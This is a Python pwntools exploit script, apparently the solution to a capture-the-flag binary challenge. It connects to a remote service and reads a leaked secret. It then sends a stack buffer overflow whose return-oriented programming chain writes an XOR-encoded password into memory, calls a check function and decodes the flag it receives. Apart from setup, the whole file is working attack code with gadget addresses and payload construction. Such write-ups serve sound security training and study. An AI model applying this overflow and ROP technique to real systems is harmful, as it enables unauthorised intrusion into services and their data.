#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
# r = remote("localhost", 10051)
r = remote("10.113.184.121", 10051)

r.recvuntil(b"secret = ")
secret = r.recvline()
secret = int(secret, 16)

pass_str = b"kyoumokawaii" + b"\x00" * 4
pass_str = p64(secret ^ u64(pass_str[:8])) + p64(secret ^ u64(pass_str[8:]))

check = 0x4017B5
empty_buf = 0x4C7320

pop_rax_ret = 0x450117
pop_rdi_ret = 0x4020AF
pop_rsi_ret = 0x40A11E
pop_rdx_pop_rbx_ret = 0x485E8B
mov_qword_ptr_rdi_rdx_ret = 0x4337E3
ret = 0x4020B0

rop_chain = b""

rop_chain += p64(pop_rdi_ret) + p64(empty_buf)
rop_chain += p64(pop_rdx_pop_rbx_ret) + pass_str[:8] + p64(0)
rop_chain += p64(mov_qword_ptr_rdi_rdx_ret)

rop_chain += p64(pop_rdi_ret) + p64(empty_buf + 8)
rop_chain += p64(pop_rdx_pop_rbx_ret) + pass_str[8:] + p64(0)
rop_chain += p64(mov_qword_ptr_rdi_rdx_ret)

rop_chain += p64(pop_rdi_ret) + p64(empty_buf)
rop_chain += p64(ret) + p64(check)

canary = b"C" * 0x0  # no canary?
old_rbp = b"B" * 0x8
payload = b"A" * 0x20 + canary + old_rbp + rop_chain

r.recvuntil(b"> ")
r.sendline(payload)

r.recvuntil(b"flag = ")
flag = r.recvline()[:16]

flag_str = p64(u64(flag[:8]) ^ u64(pass_str[:8])) + p64(u64(flag[8:]) ^ u64(pass_str[8:]))
print("flag_str = ", flag_str)

r.interactive()
